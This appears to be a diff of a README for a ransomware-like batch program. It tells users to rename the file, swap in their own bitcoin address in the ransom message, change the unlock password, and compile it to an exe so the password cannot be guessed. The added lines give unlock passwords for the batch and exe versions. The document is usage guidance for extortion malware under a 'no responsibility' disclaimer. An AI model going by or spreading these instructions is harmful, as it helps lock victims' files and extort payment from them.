@@ -5,9 +5,17 @@ this must be converted in an exe program to make the password impossible to gues
 
 ------------------------------------HOW TO USE IT?--------------------------------------
 for first you can change the file name (in my case is: is-ended and a random number.exe).
+
 then you can change the message whit your own bitcoin address.
+
 and the most important, change the password.
 
 i dont take responsability for your actions
 
 DONT BE SKID PLEASE(┬┬﹏┬┬)
+
+if you execute the file for mistake 
+
+pass for batch: @{[it.isnt.£nded]}@ 
+
+pass for exe@{[it.isnt.Â£nded]}@
